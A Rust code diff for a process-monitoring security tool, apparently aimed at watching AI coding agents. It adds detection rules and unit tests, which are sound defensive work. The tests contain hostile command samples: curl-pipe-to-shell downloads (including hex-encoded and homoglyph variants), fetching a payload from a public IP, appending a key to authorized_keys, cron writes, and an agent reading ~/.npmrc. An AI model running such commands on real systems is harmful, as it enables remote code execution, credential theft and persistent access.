@@ -16,12 +16,13 @@ struct ProcessSnapshot {
     info: ProcessInfo,
     enrichment: ProcessEnrichment,
     is_ai_agent: bool,
+    start_ticks: Option<u64>,
 }
 
 pub struct ProcessCollector {
     cfg: Config,
     tx: broadcast::Sender<SecurityEvent>,
-    prev_pids: HashSet<i32>,
+    prev_processes: HashMap<i32, Option<u64>>,
     process_tree: HashMap<i32, Vec<i32>>,
 }
 
@@ -31,7 +32,7 @@ impl ProcessCollector {
         Self {
             cfg,
             tx,
-            prev_pids: HashSet::new(),
+            prev_processes: HashMap::new(),
             process_tree: HashMap::new(),
         }
     }
@@ -67,14 +68,17 @@ impl ProcessCollector {
             }
         }
 
-        let current_pids: HashSet<i32> = current.keys().copied().collect();
         self.process_tree = self.build_process_tree(&current);
         let (ai_roots, monitored) = self.compute_monitored_sets(&current, &self.process_tree);
 
-        for pid in current_pids.difference(&self.prev_pids) {
-            let Some(snapshot) = current.get(pid) else {
-                continue;
+        for (pid, snapshot) in &current {
+            let is_new = match self.prev_processes.get(pid) {
+                Some(previous_start_ticks) => *previous_start_ticks != snapshot.start_ticks,
+                None => true,
             };
+            if !is_new {
+                continue;
+            }
 
             if !monitored.contains(pid) {
                 continue;
@@ -91,7 +95,15 @@ impl ProcessCollector {
             }
         }
 
-        for pid in self.prev_pids.difference(&current_pids) {
+        for (pid, previous_start_ticks) in &self.prev_processes {
+            let should_emit_exit = match current.get(pid) {
+                None => true,
+                Some(snapshot) => snapshot.start_ticks != *previous_start_ticks,
+            };
+            if !should_emit_exit {
+                continue;
+            }
+
             let event = mitre::infer_and_tag(SecurityEvent::new(
                 EventType::ProcessExit,
                 ThreatLevel::Green,
@@ -106,7 +118,10 @@ impl ProcessCollector {
             }
         }
 
-        self.prev_pids = current_pids;
+        self.prev_processes = current
+            .iter()
+            .map(|(pid, snapshot)| (*pid, snapshot.start_ticks))
+            .collect();
     }
 
     fn analyze_monitored_process(
@@ -204,14 +219,23 @@ impl ProcessCollector {
             ));
         }
 
-        let dangerous_hits =
-            detect_dangerous_commands(&snapshot.info.cmdline, &snapshot.enrichment.working_dir);
+        let parent = all.get(&snapshot.info.ppid);
+        let parent_name = parent.map(|p| p.info.name.as_str()).unwrap_or_default();
+        let parent_cmdline = parent
+            .map(|p| p.info.cmdline.as_str())
+            .unwrap_or_default();
+        let dangerous_hits = detect_dangerous_commands_with_context(
+            &snapshot.info.cmdline,
+            &snapshot.enrichment.working_dir,
+            &snapshot.info.name,
+            parent_name,
+            parent_cmdline,
+            &ancestry_names,
+            &snapshot.enrichment.env,
+            &snapshot.info.exe,
+        );
         if !dangerous_hits.is_empty() {
-            let level = if dangerous_hits.iter().any(|hit| {
-                hit.contains("write_sensitive_path")
-                    || hit.contains("download_exec")
-                    || hit.contains("encoded_python")
-            }) {
+            let level = if dangerous_hits.iter().copied().any(detection_is_red) {
                 ThreatLevel::Red
             } else {
                 ThreatLevel::Orange
@@ -363,6 +387,7 @@ impl ProcessCollector {
         let raw_env = self.read_env_of_interest(pid);
         let (memory_rss_kb, memory_vmsize_kb, username) = self.read_status_fields(pid);
         let start_time = self.read_start_time(pid);
+        let start_ticks = self.read_start_ticks(pid);
         let is_ai_agent = self.is_ai_agent(&stat.comm, &raw_cmdline, &raw_exe);
         let cmdline = scrub_secrets(&raw_cmdline);
         let exe = scrub_secrets(&raw_exe);
@@ -402,7 +427,14 @@ impl ProcessCollector {
             info,
             enrichment,
             is_ai_agent,
+            start_ticks,
         })
+    }
+
+    fn read_start_ticks(&self, pid: i32) -> Option<u64> {
+        let stat_path = format!("/proc/{pid}/stat");
+        let stat = fs::read_to_string(stat_path).ok()?;
+        parse_proc_start_ticks(&stat)
     }
 
     fn read_start_time(&self, pid: i32) -> Option<chrono::DateTime<chrono::Utc>> {
@@ -496,6 +528,7 @@ impl ProcessCollector {
 
     fn read_open_fds(&self, pid: i32) -> Vec<String> {
         let mut fds = Vec::new();
+        const MAX_OPEN_FDS_CAPTURED: usize = 512;
         let fd_dir = format!("/proc/{pid}/fd");
         let entries = match fs::read_dir(fd_dir) {
             Ok(entries) => entries,
@@ -505,6 +538,9 @@ impl ProcessCollector {
         for entry in entries.flatten() {
             if let Ok(target) = fs::read_link(entry.path()) {
                 fds.push(target.display().to_string());
+            }
+            if fds.len() >= MAX_OPEN_FDS_CAPTURED {
+                break;
             }
         }
 
@@ -524,7 +560,10 @@ impl ProcessCollector {
             let mut parts = entry.splitn(2, '=');
             let key = parts.next().unwrap_or_default();
             let value = parts.next().unwrap_or_default();
-            if matches!(key, "PATH" | "HOME" | "USER") {
+            if matches!(key, "PATH" | "HOME" | "USER" | "LD_PRELOAD")
+                || key.eq_ignore_ascii_case("_MEIPASS")
+                || key.eq_ignore_ascii_case("_MEIPASS2")
+            {
                 out.insert(key.to_string(), value.to_string());
             }
         }
@@ -563,6 +602,14 @@ impl ProcessCollector {
 
 fn parse_status_kb(raw: &str) -> Option<u64> {
     raw.split_whitespace().next()?.parse::<u64>().ok()
+}
+
+fn parse_proc_start_ticks(stat: &str) -> Option<u64> {
+    let close = stat.rfind(')')?;
+    let tail = stat.get(close + 2..)?;
+    let fields: Vec<&str> = tail.split_whitespace().collect();
+    let start_ticks_index = 19;
+    fields.get(start_ticks_index)?.parse::<u64>().ok()
 }
 
 /// Redacts common secret formats from arbitrary text before logging or alerting.
@@ -718,7 +765,36 @@ fn detect_credential_paths(open_fds: &[String]) -> Vec<String> {
 }
 
 fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static str> {
-    let lower = cmdline.to_ascii_lowercase();
+    let empty_ancestry = Vec::new();
+    let empty_env = HashMap::new();
+    detect_dangerous_commands_with_context(
+        cmdline,
+        working_dir,
+        "",
+        "",
+        "",
+        &empty_ancestry,
+        &empty_env,
+        "",
+    )
+}
+
+fn detect_dangerous_commands_with_context(
+    cmdline: &str,
+    working_dir: &str,
+    process_name: &str,
+    parent_name: &str,
+    parent_cmdline: &str,
+    ancestry_names: &[String],
+    env: &HashMap<String, String>,
+    exe: &str,
+) -> Vec<&'static str> {
+    let lower = canonicalize_for_detection(cmdline);
+    let lower_process = process_name.to_ascii_lowercase();
+    let lower_parent = parent_name.to_ascii_lowercase();
+    let lower_parent_cmdline = canonicalize_for_detection(parent_cmdline);
+    let lower_working_dir = working_dir.to_ascii_lowercase();
+    let lower_exe = exe.to_ascii_lowercase();
     let mut hits = Vec::new();
 
     if (lower.contains("xattr -c ") || lower.contains("xattr -c\t"))
@@ -805,6 +881,25 @@ fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static s
         hits.push("netcat_listener");
     }
 
+    if lower.contains("alias ") && (lower.contains("=curl") || lower.contains("=wget")) {
+        hits.push("command_aliasing");
+    }
+
+    if lower.contains("env ") && (lower.contains(" curl ") || lower.contains(" wget ")) {
+        hits.push("indirect_exec_env");
+    }
+
+    if lower.contains("xargs ") && (lower.contains(" curl") || lower.contains(" wget")) {
+        hits.push("indirect_exec_xargs");
+    }
+
+    if lower.contains("find ")
+        && lower.contains(" -exec ")
+        && (lower.contains("curl") || lower.contains("wget") || lower.contains("bash"))
+    {
+        hits.push("indirect_exec_find");
+    }
+
     if lower.contains("chmod +x")
         && (lower.contains("http://")
             || lower.contains("https://")
@@ -881,7 +976,159 @@ fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static s
         hits.push("write_sensitive_path");
     }
 
+    if is_rmm_tool_name(&lower_process) && has_suspicious_rmm_parent(&lower_parent) {
+        hits.push("rmm_suspicious_parent");
+    }
+
+    if is_shell_name(&lower_process)
+        && is_package_manager_name(&lower_parent)
+        && lower_parent_cmdline.contains(" install")
+    {
+        hits.push("npm_pip_postinstall_shell");
+    }
+
+    if contains_hidden_unicode(cmdline) {
+        hits.push("hidden_unicode_command");
+    }
+
+    if looks_like_file_read_command(&lower)
+        && reads_agent_credential_files(&lower)
+        && ancestry_contains_ai_runtime(ancestry_names)
+    {
+        hits.push("ai_agent_credential_access");
+    }
+
+    if in_ai_skill_directory(&lower_working_dir) {
+        hits.push("ai_skill_directory_spawn");
+    }
+
+    if is_pyinstaller_unexpected_location(env, &lower, &lower_exe) {
+        hits.push("pyinstaller_unexpected_location");
+    }
+
+    if lower_parent_cmdline.contains(" install")
+        && is_package_manager_name(&lower_parent)
+        && looks_like_network_child_process(&lower_process, &lower)
+        && contains_public_ipv4_reference(&lower)
+    {
+        hits.push("package_install_external_ip");
+    }
+
+    if env.keys().any(|key| key.eq_ignore_ascii_case("LD_PRELOAD")) {
+        hits.push("ld_preload_set");
+    }
+
+    if lower.contains("crontab -e") || writes_cron_path(&lower) {
+        hits.push("crontab_modification");
+    }
+
+    if writes_authorized_keys(&lower) {
+        hits.push("ssh_authorized_keys_modification");
+    }
+
     hits
+}
+
+fn detection_is_red(hit: &str) -> bool {
+    matches!(
+        hit,
+        "write_sensitive_path"
+            | "download_exec"
+            | "download_exec_tmpdir"
+            | "encoded_python"
+            | "rmm_suspicious_parent"
+            | "hidden_unicode_command"
+            | "ai_agent_credential_access"
+            | "pyinstaller_unexpected_location"
+            | "ld_preload_set"
+            | "ssh_authorized_keys_modification"
+    )
+}
+
+fn canonicalize_for_detection(input: &str) -> String {
+    let decoded_hex = decode_hex_escapes(input);
+    let decoded_percent = decode_percent_escapes(&decoded_hex);
+    let mapped = map_common_confusables(&decoded_percent);
+    mapped
+        .chars()
+        .map(|ch| {
+            if ch.is_control() {
+                ' '
+            } else {
+                ch.to_ascii_lowercase()
+            }
+        })
+        .collect()
+}
+
+fn decode_hex_escapes(input: &str) -> String {
+    let bytes = input.as_bytes();
+    let mut out = String::with_capacity(input.len());
+    let mut idx = 0;
+    while idx < bytes.len() {
+        if bytes[idx] == b'\\'
+            && idx + 3 < bytes.len()
+            && (bytes[idx + 1] == b'x' || bytes[idx + 1] == b'X')
+            && bytes[idx + 2].is_ascii_hexdigit()
+            && bytes[idx + 3].is_ascii_hexdigit()
+        {
+            let value = std::str::from_utf8(&bytes[idx + 2..idx + 4])
+                .ok()
+                .and_then(|hex| u8::from_str_radix(hex, 16).ok())
+                .unwrap_or_default();
+            out.push(value as char);
+            idx += 4;
+            continue;
+        }
+        let ch = input[idx..].chars().next().unwrap_or_default();
+        out.push(ch);
+        idx += ch.len_utf8();
+    }
+    out
+}
+
+fn decode_percent_escapes(input: &str) -> String {
+    let bytes = input.as_bytes();
+    let mut out = String::with_capacity(input.len());
+    let mut idx = 0;
+    while idx < bytes.len() {
+        if bytes[idx] == b'%'
+            && idx + 2 < bytes.len()
+            && bytes[idx + 1].is_ascii_hexdigit()
+            && bytes[idx + 2].is_ascii_hexdigit()
+        {
+            let value = std::str::from_utf8(&bytes[idx + 1..idx + 3])
+                .ok()
+                .and_then(|hex| u8::from_str_radix(hex, 16).ok())
+                .unwrap_or_default();
+            out.push(value as char);
+            idx += 3;
+            continue;
+        }
+        let ch = input[idx..].chars().next().unwrap_or_default();
+        out.push(ch);
+        idx += ch.len_utf8();
+    }
+    out
+}
+
+fn map_common_confusables(input: &str) -> String {
+    input
+        .chars()
+        .map(|ch| match ch {
+            'е' | 'Ｅ' => 'e',
+            'а' | 'Ａ' => 'a',
+            'о' | 'Ｏ' => 'o',
+            'с' | 'Ｃ' => 'c',
+            'р' | 'Ｐ' => 'p',
+            'х' | 'Х' | 'Ｘ' => 'x',
+            'у' | 'Ｙ' => 'y',
+            'к' | 'Ｋ' => 'k',
+            'і' | 'Ｉ' => 'i',
+            '⁄' | '∕' | '／' => '/',
+            _ => ch,
+        })
+        .collect()
 }
 
 fn extract_ssh_target_host(cmdline: &str) -> Option<String> {
@@ -1012,6 +1259,154 @@ fn parse_ipv4_octets(host: &str) -> Option<(u8, u8, u8, u8)> {
     Some((a, b, c, d))
 }
 
+fn is_rmm_tool_name(process_name: &str) -> bool {
+    [
+        "screenconnect",
+        "anydesk",
+        "teamviewer",
+        "connectwise",
+        "rustdesk",
+    ]
+        .iter()
+        .any(|needle| process_name.contains(needle))
+}
+
+fn has_suspicious_rmm_parent(parent_name: &str) -> bool {
+    ["code", "cursor", "windsurf", "node", "python", "electron"]
+        .iter()
+        .any(|needle| parent_name.contains(needle))
+}
+
+fn is_shell_name(name: &str) -> bool {
+    matches!(name, "bash" | "sh" | "zsh" | "fish" | "dash" | "csh" | "tcsh")
+}
+
+fn is_package_manager_name(name: &str) -> bool {
+    ["npm", "pip", "cargo", "gem", "yarn", "pnpm", "bun"]
+        .iter()
+        .any(|needle| name.contains(needle))
+}
+
+fn contains_hidden_unicode(raw: &str) -> bool {
+    raw.chars().any(|ch| {
+        matches!(ch, '\u{200b}' | '\u{200d}' | '\u{feff}') || ('\u{e000}'..='\u{f8ff}').contains(&ch)
+    })
+}
+
+fn looks_like_file_read_command(cmdline: &str) -> bool {
+    cmdline.starts_with("cat ")
+        || cmdline.starts_with("less ")
+        || cmdline.starts_with("more ")
+        || cmdline.starts_with("head ")
+        || cmdline.starts_with("tail ")
+        || cmdline.starts_with("grep ")
+        || cmdline.starts_with("awk ")
+        || cmdline.starts_with("sed ")
+        || cmdline.contains(" cat ")
+}
+
+fn reads_agent_credential_files(cmdline: &str) -> bool {
+    [".env", ".npmrc", ".netrc", ".gitconfig"]
+        .iter()
+        .any(|needle| cmdline.contains(needle))
+}
+
+fn ancestry_contains_ai_runtime(ancestry_names: &[String]) -> bool {
+    ancestry_names.iter().any(|name| {
+        let lower = name.to_ascii_lowercase();
+        ["node", "python", "cursor", "code", "codex"]
+            .iter()
+            .any(|needle| lower.contains(needle))
+    })
+}
+
+fn in_ai_skill_directory(working_dir: &str) -> bool {
+    [
+        "/skills/",
+        "/plugins/",
+        "/extensions/",
+        "/.openclaw/",
+        "/.cursor/",
+        "/.vscode/",
+    ]
+    .iter()
+    .any(|needle| working_dir.contains(needle))
+}
+
+fn is_pyinstaller_unexpected_location(
+    env: &HashMap<String, String>,
+    lower_cmdline: &str,
+    lower_exe: &str,
+) -> bool {
+    let has_mei_env = env
+        .keys()
+        .any(|key| key.eq_ignore_ascii_case("_MEIPASS") || key.eq_ignore_ascii_case("_MEIPASS2"));
+    let runs_from_mei = lower_cmdline.contains("/_mei") || lower_exe.contains("/_mei");
+    let in_dependency_tree = lower_cmdline.contains("node_modules")
+        || lower_cmdline.contains("site-packages")
+        || lower_cmdline.contains("dist-packages")
+        || lower_exe.contains("node_modules")
+        || lower_exe.contains("site-packages")
+        || lower_exe.contains("dist-packages");
+    (has_mei_env || runs_from_mei) && in_dependency_tree
+}
+
+fn looks_like_network_child_process(process_name: &str, cmdline: &str) -> bool {
+    ["curl", "wget", "nc", "ncat", "python", "python3"]
+        .iter()
+        .any(|needle| process_name == *needle || cmdline.starts_with(&format!("{needle} ")))
+}
+
+fn contains_public_ipv4_reference(cmdline: &str) -> bool {
+    cmdline.split_whitespace().any(|token| {
+        let host = token
+            .trim_start_matches("http://")
+            .trim_start_matches("https://")
+            .split('/')
+            .next()
+            .unwrap_or_default()
+            .split(':')
+            .next()
+            .unwrap_or_default()
+            .trim_matches(|c| c == '[' || c == ']');
+
+        let Some((a, b, _, _)) = parse_ipv4_octets(host) else {
+            return false;
+        };
+        if a == 10 || a == 127 {
+            return false;
+        }
+        if a == 172 && (16..=31).contains(&b) {
+            return false;
+        }
+        if a == 192 && b == 168 {
+            return false;
+        }
+        true
+    })
+}
+
+fn writes_cron_path(cmdline: &str) -> bool {
+    let writes = cmdline.contains(" > ")
+        || cmdline.contains(" >> ")
+        || cmdline.contains("tee ")
+        || cmdline.contains("cp ")
+        || cmdline.contains("mv ")
+        || cmdline.contains("install ");
+    writes && (cmdline.contains("/var/spool/cron/") || cmdline.contains("/etc/cron.d/"))
+}
+
+fn writes_authorized_keys(cmdline: &str) -> bool {
+    (cmdline.contains(" > ")
+        || cmdline.contains(" >> ")
+        || cmdline.contains("tee ")
+        || cmdline.contains("cp ")
+        || cmdline.contains("mv ")
+        || cmdline.contains("install "))
+        && (cmdline.contains("~/.ssh/authorized_keys")
+            || cmdline.contains("/.ssh/authorized_keys"))
+}
+
 fn normalize_exec_token(input: &str) -> String {
     let token = input.trim().trim_matches('"').trim_matches('\'');
     Path::new(token)
@@ -1048,8 +1443,12 @@ pub fn allow_list_entry_matches(entry_name: &str, name: &str, cmdline: &str, exe
 
 #[cfg(test)]
 mod tests {
+    use std::collections::HashMap;
+
     use super::ProcessCollector;
     use super::detect_dangerous_commands;
+    use super::detect_dangerous_commands_with_context;
+    use super::detection_is_red;
     use super::scrub_secrets;
     use crate::config::Config;
     use crate::models::SecurityEvent;
@@ -1076,6 +1475,31 @@ mod tests {
         assert!(
             hits.contains(&"download_pipe_shell"),
             "curl pipe bash should be flagged as download_pipe_shell"
+        );
+    }
+
+    #[test]
+    fn detects_homoglyph_and_encoded_curl_variants() {
+        let hits_homoglyph = detect_dangerous_commands("сurl https://example.com/x.sh | bash", "/");
+        assert!(hits_homoglyph.contains(&"download_pipe_shell"));
+
+        let hits_hex = detect_dangerous_commands("\\x63\\x75\\x72\\x6c https://a | bash", "/");
+        assert!(hits_hex.contains(&"download_pipe_shell"));
+    }
+
+    #[test]
+    fn detects_indirect_execution_variants() {
+        assert!(
+            detect_dangerous_commands("env curl https://x | sh", "/")
+                .contains(&"indirect_exec_env")
+        );
+        assert!(
+            detect_dangerous_commands("printf curl | xargs -I{} {} https://x", "/")
+                .contains(&"indirect_exec_xargs")
+        );
+        assert!(
+            detect_dangerous_commands("find . -exec curl https://x \\;", "/")
+                .contains(&"indirect_exec_find")
         );
     }
 
@@ -1259,6 +1683,151 @@ mod tests {
             detect_dangerous_commands("curl -fsSL http://example.com/a | base64 -d | gunzip", "/")
                 .contains(&"fileless_pipeline_decode")
         );
+    }
+
+    #[test]
+    fn detects_rmm_spawned_by_ide_parent() {
+        let hits = detect_dangerous_commands_with_context(
+            "screenconnect --session abc",
+            "/home/ryan/projects/leash",
+            "screenconnect",
+            "code",
+            "code --reuse-window .",
+            &["codex".into(), "code".into(), "screenconnect".into()],
+            &HashMap::new(),
+            "/usr/bin/screenconnect",
+        );
+        assert!(hits.contains(&"rmm_suspicious_parent"));
+        assert!(detection_is_red("rmm_suspicious_parent"));
+    }
+
+    #[test]
+    fn detects_npm_postinstall_shell_execution() {
+        let hits = detect_dangerous_commands_with_context(
+            "sh -c ./postinstall.sh",
+            "/tmp/pkg",
+            "sh",
+            "npm",
+            "npm install evil-pkg",
+            &["node".into(), "npm".into(), "sh".into()],
+            &HashMap::new(),
+            "/bin/sh",
+        );
+        assert!(hits.contains(&"npm_pip_postinstall_shell"));
+    }
+
+    #[test]
+    fn detects_hidden_unicode_in_command() {
+        let hits = detect_dangerous_commands_with_context(
+            "curl\u{200b} https://example.com/install.sh | sh",
+            "/tmp",
+            "sh",
+            "bash",
+            "bash -lc run",
+            &["codex".into(), "bash".into(), "sh".into()],
+            &HashMap::new(),
+            "/bin/sh",
+        );
+        assert!(hits.contains(&"hidden_unicode_command"));
+        assert!(detection_is_red("hidden_unicode_command"));
+    }
+
+    #[test]
+    fn detects_ai_agent_credential_access_reads() {
+        let hits = detect_dangerous_commands_with_context(
+            "cat ~/.npmrc",
+            "/home/ryan",
+            "cat",
+            "python3",
+            "python3 agent.py",
+            &["codex".into(), "python3".into(), "cat".into()],
+            &HashMap::new(),
+            "/bin/cat",
+        );
+        assert!(hits.contains(&"ai_agent_credential_access"));
+        assert!(detection_is_red("ai_agent_credential_access"));
+    }
+
+    #[test]
+    fn detects_process_spawn_from_skill_like_directories() {
+        let hits = detect_dangerous_commands_with_context(
+            "node run-task.js",
+            "/home/ryan/.codex/skills/custom",
+            "node",
+            "codex",
+            "codex run",
+            &["codex".into(), "node".into()],
+            &HashMap::new(),
+            "/usr/bin/node",
+        );
+        assert!(hits.contains(&"ai_skill_directory_spawn"));
+    }
+
+    #[test]
+    fn detects_pyinstaller_binary_in_dependency_tree() {
+        let mut env = HashMap::new();
+        env.insert("_MEIPASS".to_string(), "/tmp/_MEI12345".to_string());
+        let hits = detect_dangerous_commands_with_context(
+            "/tmp/_MEI12345/payload",
+            "/tmp",
+            "payload",
+            "node",
+            "node node_modules/evil/install.js",
+            &["node".into(), "payload".into()],
+            &env,
+            "/home/ryan/project/node_modules/evil/_MEI12345/payload",
+        );
+        assert!(hits.contains(&"pyinstaller_unexpected_location"));
+        assert!(detection_is_red("pyinstaller_unexpected_location"));
+    }
+
+    #[test]
+    fn detects_external_ip_connection_during_install() {
+        let hits = detect_dangerous_commands_with_context(
+            "curl http://8.8.8.8/payload.sh",
+            "/tmp/pkg",
+            "curl",
+            "npm",
+            "npm install suspicious-package",
+            &["node".into(), "npm".into(), "curl".into()],
+            &HashMap::new(),
+            "/usr/bin/curl",
+        );
+        assert!(hits.contains(&"package_install_external_ip"));
+    }
+
+    #[test]
+    fn detects_ld_preload_environment_variable() {
+        let mut env = HashMap::new();
+        env.insert("LD_PRELOAD".to_string(), "/tmp/libmalicious.so".to_string());
+        let hits = detect_dangerous_commands_with_context(
+            "/usr/bin/ls",
+            "/tmp",
+            "ls",
+            "bash",
+            "bash -lc ls",
+            &["codex".into(), "bash".into(), "ls".into()],
+            &env,
+            "/usr/bin/ls",
+        );
+        assert!(hits.contains(&"ld_preload_set"));
+        assert!(detection_is_red("ld_preload_set"));
+    }
+
+    #[test]
+    fn detects_crontab_modification_commands() {
+        assert!(detect_dangerous_commands("crontab -e", "/").contains(&"crontab_modification"));
+        assert!(
+            detect_dangerous_commands("echo job > /etc/cron.d/system-update", "/")
+                .contains(&"crontab_modification")
+        );
+    }
+
+    #[test]
+    fn detects_ssh_authorized_keys_modification() {
+        let hits = detect_dangerous_commands("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "/");
+        assert!(hits.contains(&"ssh_authorized_keys_modification"));
+        assert!(detection_is_red("ssh_authorized_keys_modification"));
     }
 
     #[test]
